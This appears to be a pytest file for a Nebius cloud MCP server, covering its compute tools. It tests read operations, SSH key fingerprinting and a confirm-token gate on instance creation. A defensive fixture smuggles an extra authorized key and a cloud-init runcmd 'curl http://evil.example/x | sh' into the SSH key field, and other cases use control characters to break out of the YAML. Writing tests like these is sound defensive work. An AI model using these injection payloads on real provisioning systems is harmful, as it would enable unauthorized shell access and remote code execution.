"""Tests for Compute tools: the read verbs, and the create confirm gate."""

from __future__ import annotations

import base64
import json
from typing import Any
from unittest.mock import MagicMock

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError

from nebius_mcp.client import reset_clients
from nebius_mcp.confirm import reset as reset_tickets
from nebius_mcp.server import _build_app


@pytest.fixture(autouse=True)
def _no_real_sdk(monkeypatch: pytest.MonkeyPatch) -> None:
    reset_clients()
    reset_tickets()
    monkeypatch.setenv("NEBIUS_IAM_TOKEN", "tok-fake")
    monkeypatch.delenv("NEBIUS_PROFILE", raising=False)


def _async_returns(value: Any) -> Any:
    async def coro() -> Any:
        return value

    return coro()


def _wrapper_for(items: list[Any], next_token: str | None = None) -> Any:
    resp = MagicMock()
    resp.items = items
    resp.next_page_token = next_token
    return resp


def _fake_proto(payload: dict[str, Any]) -> Any:
    class _Fake:
        def __init__(self, p: dict[str, Any]) -> None:
            self._payload = p

    return _Fake(payload)


@pytest.fixture
def mock_service(monkeypatch: pytest.MonkeyPatch) -> dict[type, MagicMock]:
    registry: dict[type, MagicMock] = {}

    def fake_service(cls: type) -> Any:
        if cls not in registry:
            registry[cls] = MagicMock()
        return registry[cls]

    monkeypatch.setattr("nebius_mcp.tools.compute.service", fake_service)
    return registry


@pytest.fixture
def patch_proto(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_safe_proto(message: Any) -> dict[str, Any]:
        from nebius_mcp.sanitize import redact

        if hasattr(message, "_payload"):
            return redact(message._payload)
        return redact(message)

    monkeypatch.setattr("nebius_mcp.tools.compute.safe_proto", fake_safe_proto)


@pytest.mark.asyncio
async def test_list_instances_uses_explicit_parent(mock_service: dict, patch_proto: None) -> None:
    from nebius.api.nebius.compute.v1 import InstanceServiceClient, ListInstancesRequest

    captured = {}

    def fake_list(req: ListInstancesRequest) -> Any:
        captured["parent_id"] = req.parent_id
        captured["page_size"] = req.page_size
        return _async_returns(_wrapper_for([_fake_proto({"id": "i-1"})]))

    client_mock = MagicMock()
    client_mock.list = fake_list
    mock_service[InstanceServiceClient] = client_mock

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool(
            "compute_list_instances", {"parent_id": "project-explicit", "page_size": 5}
        )

    assert captured["parent_id"] == "project-explicit"
    assert captured["page_size"] == 5
    assert result.data["data"]["parent_id"] == "project-explicit"
    assert result.data["data"]["items"] == [{"id": "i-1"}]


@pytest.mark.asyncio
async def test_list_instances_uses_profile_parent(
    mock_service: dict, patch_proto: None, monkeypatch: pytest.MonkeyPatch, tmp_path: Any
) -> None:
    cfg = tmp_path / "config.yaml"
    cfg.write_text(
        "default: dev\nprofiles:\n  dev:\n    parent-id: project-from-profile\n",
        encoding="utf-8",
    )
    monkeypatch.setattr("nebius_mcp.auth.DEFAULT_CONFIG_PATH", cfg)
    monkeypatch.delenv("NEBIUS_PROFILE", raising=False)

    from nebius.api.nebius.compute.v1 import InstanceServiceClient, ListInstancesRequest

    captured = {}

    def fake_list(req: ListInstancesRequest) -> Any:
        captured["parent_id"] = req.parent_id
        return _async_returns(_wrapper_for([]))

    client_mock = MagicMock()
    client_mock.list = fake_list
    mock_service[InstanceServiceClient] = client_mock

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool("compute_list_instances", {})

    assert captured["parent_id"] == "project-from-profile"
    assert result.data["data"]["parent_id"] == "project-from-profile"


@pytest.mark.asyncio
async def test_list_instances_no_parent_returns_empty(mock_service: dict) -> None:
    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool("compute_list_instances", {})
    assert result.data["data"]["items"] == []
    assert "_note" in result.data


@pytest.mark.asyncio
async def test_get_instance(mock_service: dict, patch_proto: None) -> None:
    from nebius.api.nebius.compute.v1 import GetInstanceRequest, InstanceServiceClient

    captured = {}

    def fake_get(req: GetInstanceRequest) -> Any:
        captured["id"] = req.id
        return _async_returns(_fake_proto({"id": req.id, "name": "vm-x"}))

    client_mock = MagicMock()
    client_mock.get = fake_get
    mock_service[InstanceServiceClient] = client_mock

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool("compute_get_instance", {"id": "computeinstance-abc"})

    assert captured["id"] == "computeinstance-abc"
    assert result.data["data"]["name"] == "vm-x"


@pytest.mark.asyncio
async def test_list_disks_with_filter(mock_service: dict, patch_proto: None) -> None:
    from nebius.api.nebius.compute.v1 import DiskServiceClient, ListDisksRequest

    captured = {}

    def fake_list(req: ListDisksRequest) -> Any:
        captured["parent_id"] = req.parent_id
        captured["filter"] = req.filter
        return _async_returns(_wrapper_for([_fake_proto({"id": "d-1"})]))

    client_mock = MagicMock()
    client_mock.list = fake_list
    mock_service[DiskServiceClient] = client_mock

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool(
            "compute_list_disks", {"parent_id": "project-1", "filter": "name='disk-x'"}
        )

    assert captured["filter"] == "name='disk-x'"
    assert result.data["data"]["items"] == [{"id": "d-1"}]


@pytest.mark.asyncio
async def test_list_platforms(mock_service: dict, patch_proto: None) -> None:
    from nebius.api.nebius.compute.v1 import ListPlatformsRequest, PlatformServiceClient

    captured = {}

    def fake_list(req: ListPlatformsRequest) -> Any:
        captured["parent_id"] = req.parent_id
        return _async_returns(
            _wrapper_for([_fake_proto({"name": "cpu-d3"}), _fake_proto({"name": "gpu-h100"})])
        )

    client_mock = MagicMock()
    client_mock.list = fake_list
    mock_service[PlatformServiceClient] = client_mock

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool("compute_list_platforms", {"parent_id": "tenant-1"})

    assert captured["parent_id"] == "tenant-1"
    items = result.data["data"]["items"]
    assert {"name": "cpu-d3"} in items
    assert {"name": "gpu-h100"} in items


# Two throwaway ed25519 keys. The fingerprints below are what `ssh-keygen -lf`
# prints for them, so a drift in _ssh_key_summary shows up as a mismatch with
# the tool an operator would use to check a key against their own.
KEY_ALICE = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5+Y10cfnflIWly/FUCk/eWvRbsfqDJb8nXGyTA69+l alice@laptop"
)
FP_ALICE = "SHA256:vw8b3vmwyqTc0wIlLtLOoesoz20Vs+gXOzL7IAaOOlw"
KEY_MALLORY = (
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMHuXfCvL8pfBaONNkrc18nSZGBqPbicGIm0QU/hkZPW mallory@vps"
)
FP_MALLORY = "SHA256:UjYpxIrAD9jjBaqXbU3J6UcwnUtbyG061yx2nP04x+o"


def test_ssh_key_summary_matches_ssh_keygen() -> None:
    from nebius_mcp.tools.compute import _ssh_key_summary

    assert _ssh_key_summary(KEY_ALICE) == {
        "key_type": "ssh-ed25519",
        "fingerprint": FP_ALICE,
        "comment": "alice@laptop",
    }


def test_ssh_key_summary_omits_absent_comment() -> None:
    from nebius_mcp.tools.compute import _ssh_key_summary

    keytype, blob = KEY_ALICE.split()[:2]
    assert _ssh_key_summary(f"{keytype} {blob}") == {
        "key_type": "ssh-ed25519",
        "fingerprint": FP_ALICE,
    }


@pytest.mark.parametrize(
    "garbage",
    [
        "",
        "   \n ",
        "ssh-ed25519",
        "ssh-ed25519 not!!valid!!base64 alice@laptop",
        "ssh-ed25519 AAAAB3NzaC1yc2E=",  # decodes, but names ssh-rsa, not ed25519
        "ключ ключ",
    ],
)
def test_ssh_key_summary_falls_back_without_raising(garbage: str) -> None:
    from nebius_mcp.tools.compute import _ssh_key_summary

    summary = _ssh_key_summary(garbage)
    assert summary["key_type"] == "unrecognized"
    assert summary["fingerprint"].startswith("text-sha256:")
    assert "not of a key blob" in summary["note"]


def test_ssh_key_summary_bounds_a_huge_comment() -> None:
    """A key line may parse and still carry 50KB of trailer; the preview must not."""
    from nebius_mcp.tools.compute import _MAX_ECHO_CHARS, _ssh_key_summary

    trailer = "A" * 50_000
    summary = _ssh_key_summary(f"{KEY_ALICE} {trailer}")

    assert summary["fingerprint"] == FP_ALICE
    comment = summary["comment"]
    full_length = len("alice@laptop") + 1 + len(trailer)
    assert f"truncated, {full_length} characters total" in comment
    assert len(comment) <= _MAX_ECHO_CHARS + 60
    assert trailer not in json.dumps(summary)


def test_ssh_key_summary_bounds_a_huge_key_type() -> None:
    """key_type is caller-controlled too: a blob can name a 5000-character algorithm."""
    from nebius_mcp.tools.compute import _MAX_ECHO_CHARS, _ssh_key_summary

    huge = "z" * 5000
    blob = base64.b64encode(len(huge).to_bytes(4, "big") + huge.encode("ascii")).decode("ascii")
    summary = _ssh_key_summary(f"{huge} {blob}")

    # It parses -- the blob really does name its own type -- so this is the
    # branch that echoes, and the echo has to be capped there too.
    assert summary["fingerprint"].startswith("SHA256:")
    assert f"truncated, {len(huge)} characters total" in summary["key_type"]
    assert len(summary["key_type"]) <= _MAX_ECHO_CHARS + 60


def test_ssh_key_summary_withholds_a_pasted_private_key() -> None:
    """A private key in the preview would be a leak; only its digest may appear."""
    from nebius_mcp.tools.compute import _ssh_key_summary

    body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmVOT1RBUkVBTEtFWQ=="
    private = _openssh_private_key(body)
    marker = "-" * 5 + "BEGIN OPENSSH PRIVATE KEY" + "-" * 5

    rendered = json.dumps(_ssh_key_summary(private))
    assert body not in rendered
    assert marker not in rendered
    assert "-----BEGIN" not in rendered


def _fake_create_op() -> MagicMock:
    op = MagicMock()
    op.id = "operation-create"
    op.resource_id = "computeinstance-new"
    op.done = True
    op.successful = True
    op.status = "OK"
    op.description = "create instance"

    async def _wait(**_: Any) -> None:
        return None

    op.wait = _wait
    return op


def _openssh_private_key(body: str) -> str:
    """Assemble a PEM private key rather than writing one as a literal.

    A committed string carrying a real PEM header trips secret scanners on every
    future commit that touches this file, and allowlisting the file would blind
    the scanner to a genuine key pasted here later. The test needs the value to
    *look* like a private key — that is the whole point — so it is built at
    runtime. ``tests/unit/test_sanitize.py`` takes the same approach.
    """
    begin = "-" * 5 + "BEGIN OPENSSH PRIVATE KEY" + "-" * 5
    end = "-" * 5 + "END OPENSSH PRIVATE KEY" + "-" * 5
    return begin + "\n" + body + "\n" + end


def _create_args(ssh_public_key: str, **overrides: Any) -> dict[str, Any]:
    args: dict[str, Any] = {
        "name": "vm-1",
        "parent_id": "project-test",
        "platform": "cpu-d3",
        "preset": "4vcpu-16gb",
        "image_family": "ubuntu22.04",
        "subnet_id": "vpcsubnet-test",
        "ssh_public_key": ssh_public_key,
    }
    args.update(overrides)
    return args


@pytest.fixture
def create_client(mock_service: dict, monkeypatch: pytest.MonkeyPatch) -> MagicMock:
    from nebius.api.nebius.compute.v1 import InstanceServiceClient

    monkeypatch.setenv("NEBIUS_MCP_MODE", "write")
    client_mock = MagicMock()
    # side_effect, not return_value: a coroutine can only be awaited once, and
    # some of these tests call the tool twice.
    client_mock.create = MagicMock(side_effect=lambda _req: _async_returns(_fake_create_op()))
    mock_service[InstanceServiceClient] = client_mock
    return client_mock


@pytest.mark.asyncio
async def test_create_instance_preview_fingerprints_the_key(create_client: MagicMock) -> None:
    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool("compute_create_instance", _create_args(KEY_ALICE))

    assert create_client.create.call_count == 0
    assert result.data["preview"]["ssh_key"] == {
        "key_type": "ssh-ed25519",
        "fingerprint": FP_ALICE,
        "comment": "alice@laptop",
    }
    # The reader gets a fingerprint to compare, not the key line echoed back.
    assert KEY_ALICE not in json.dumps(result.data)


@pytest.mark.asyncio
async def test_create_instance_token_rejects_a_swapped_ssh_key(create_client: MagicMock) -> None:
    """The token binds the key, so it cannot authorize shell for a different one."""
    app = _build_app()
    async with Client(app) as c:
        first = await c.call_tool("compute_create_instance", _create_args(KEY_ALICE))
        token = first.data["confirm_token"]
        second = await c.call_tool(
            "compute_create_instance",
            _create_args(KEY_MALLORY, confirm_token=token),
        )

    assert create_client.create.call_count == 0
    # Rejection is a fresh dry run over the new key, not a silent execution.
    assert second.data["confirm_token"] != token
    assert second.data["preview"]["ssh_key"]["fingerprint"] == FP_MALLORY


@pytest.mark.asyncio
async def test_create_instance_executes_with_the_same_ssh_key(create_client: MagicMock) -> None:
    app = _build_app()
    async with Client(app) as c:
        first = await c.call_tool("compute_create_instance", _create_args(KEY_ALICE))
        token = first.data["confirm_token"]
        result = await c.call_tool(
            "compute_create_instance",
            _create_args(KEY_ALICE, confirm_token=token),
        )

    assert create_client.create.call_count == 1
    assert result.data["data"]["resource_id"] == "computeinstance-new"
    request = create_client.create.call_args.args[0]
    assert KEY_ALICE in request.spec.cloud_init_user_data


@pytest.mark.asyncio
async def test_create_instance_token_survives_trailing_whitespace(
    create_client: MagicMock,
) -> None:
    """Both calls are normalised the way cloud-init is, so padding is not a mismatch."""
    app = _build_app()
    async with Client(app) as c:
        first = await c.call_tool("compute_create_instance", _create_args(KEY_ALICE))
        token = first.data["confirm_token"]
        await c.call_tool(
            "compute_create_instance",
            _create_args(f"  {KEY_ALICE}\n", confirm_token=token),
        )

    assert create_client.create.call_count == 1


# The cloud-config the tool builds puts the key on the line after
# "ssh_authorized_keys:". A newline in the value closes that list item, and
# whatever follows is parsed at whatever indentation it carries -- here, a
# second authorized key and a top-level runcmd that fetches and runs a script.
INJECTION_KEY = (
    KEY_ALICE + "\n      - " + KEY_MALLORY + "\nruncmd:\n  - curl http://evil.example/x | sh"
)


def _no_ticket_was_issued() -> bool:
    """True when the confirm-token store is empty, i.e. no token was minted."""
    from nebius_mcp import confirm

    return not confirm._active


@pytest.mark.asyncio
async def test_create_instance_rejects_cloud_init_injection(create_client: MagicMock) -> None:
    """A key line carrying extra cloud-config is refused, not previewed and not run."""
    app = _build_app()
    async with Client(app) as c:
        with pytest.raises(ToolError) as ei:
            await c.call_tool("compute_create_instance", _create_args(INJECTION_KEY))

    message = str(ei.value)
    assert "ssh_public_key" in message
    assert "single line" in message
    # Refused before the SDK was touched and before a token existed: a token
    # here would be an approval prompt for a call that must never be approved.
    assert create_client.create.call_count == 0
    assert _no_ticket_was_issued()
    # Neither the second key nor the injected command leaks into the error.
    assert KEY_MALLORY not in message
    assert "evil.example" not in message


@pytest.mark.parametrize(
    ("label", "key"),
    [
        ("carriage-return", KEY_ALICE + "\r      - " + KEY_MALLORY),
        ("crlf", KEY_ALICE + "\r\nruncmd:\n  - id"),
        ("nul", KEY_ALICE + "\x00 trailing"),
        ("bell", KEY_ALICE + "\x07"),
        ("tab-between-fields", KEY_ALICE.replace(" ", "\t", 1)),
        ("vertical-tab", KEY_ALICE + "\x0b- " + KEY_MALLORY),
        # Python's own str.splitlines() breaks on U+2028 and U+0085, and
        # str.split() counts them as whitespace, so a rule spelled "no \n"
        # would let these through.
        ("line-separator", KEY_ALICE + "\u2028      - " + KEY_MALLORY),
        ("next-line", KEY_ALICE + "\x85      - " + KEY_MALLORY),
        ("whitespace-only", "   "),
    ],
)
async def test_create_instance_rejects_unsafe_ssh_key_characters(
    create_client: MagicMock, label: str, key: str
) -> None:
    app = _build_app()
    async with Client(app) as c:
        with pytest.raises(ToolError) as ei:
            await c.call_tool("compute_create_instance", _create_args(key))

    assert "ssh_public_key" in str(ei.value)
    assert create_client.create.call_count == 0
    assert _no_ticket_was_issued(), label


@pytest.mark.asyncio
async def test_create_instance_rejects_a_value_that_is_not_a_key(
    create_client: MagicMock,
) -> None:
    """One line of harmless ASCII still has to be a key before it earns a fingerprint."""
    app = _build_app()
    async with Client(app) as c:
        with pytest.raises(ToolError) as ei:
            await c.call_tool("compute_create_instance", _create_args("please give me a shell"))

    message = str(ei.value)
    assert "not a well-formed OpenSSH public key line" in message
    assert create_client.create.call_count == 0
    assert _no_ticket_was_issued()


@pytest.mark.asyncio
async def test_create_instance_does_not_echo_a_pasted_private_key_in_the_refusal(
    create_client: MagicMock,
) -> None:
    """The likeliest wrong paste is a private key; refusing must not reprint it."""
    body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmVOT1RBUkVBTEtFWQ=="
    private = _openssh_private_key(body)

    app = _build_app()
    async with Client(app) as c:
        with pytest.raises(ToolError) as ei:
            await c.call_tool("compute_create_instance", _create_args(private))

    assert body not in str(ei.value)
    assert "-----BEGIN" not in str(ei.value)
    assert create_client.create.call_count == 0


@pytest.mark.asyncio
async def test_create_instance_accepts_extra_spaces_between_fields(
    create_client: MagicMock,
) -> None:
    """Interior spaces are tolerated: they cannot break out of the YAML list item."""
    keytype, blob, comment = KEY_ALICE.split()
    padded = f"{keytype}   {blob}  {comment}"

    app = _build_app()
    async with Client(app) as c:
        first = await c.call_tool("compute_create_instance", _create_args(padded))
        token = first.data["confirm_token"]
        await c.call_tool("compute_create_instance", _create_args(padded, confirm_token=token))

    assert first.data["preview"]["ssh_key"]["fingerprint"] == FP_ALICE
    assert create_client.create.call_count == 1
    request = create_client.create.call_args.args[0]
    assert f"      - {padded}\n" in request.spec.cloud_init_user_data


@pytest.mark.asyncio
async def test_create_instance_preview_bounds_a_huge_key_comment(
    create_client: MagicMock,
) -> None:
    """Validation leaves the line single; it does not stop the line being 50KB long."""
    trailer = "A" * 50_000

    app = _build_app()
    async with Client(app) as c:
        result = await c.call_tool(
            "compute_create_instance", _create_args(f"{KEY_ALICE} {trailer}")
        )

    rendered = json.dumps(result.data)
    assert result.data["preview"]["ssh_key"]["fingerprint"] == FP_ALICE
    assert trailer not in rendered
    assert len(rendered) < 2000


@pytest.mark.asyncio
async def test_wait_and_timeout_are_outside_the_confirm_binding(
    create_client: MagicMock,
) -> None:
    """They do not change the VM, so they are not bound -- and the description says so."""
    app = _build_app()
    async with Client(app) as c:
        first = await c.call_tool(
            "compute_create_instance",
            _create_args(KEY_ALICE, wait=True, timeout_seconds=300),
        )
        token = first.data["confirm_token"]
        await c.call_tool(
            "compute_create_instance",
            _create_args(KEY_ALICE, confirm_token=token, wait=False, timeout_seconds=7),
        )
        tools = {t.name: t for t in await c.list_tools()}

    # The token minted under wait=True/timeout=300 still executes a call made
    # with wait=False/timeout=7.
    assert create_client.create.call_count == 1

    description = tools["compute_create_instance"].description or ""
    assert "bound to every argument" not in description
    assert "wait and timeout_seconds are outside the binding" in description
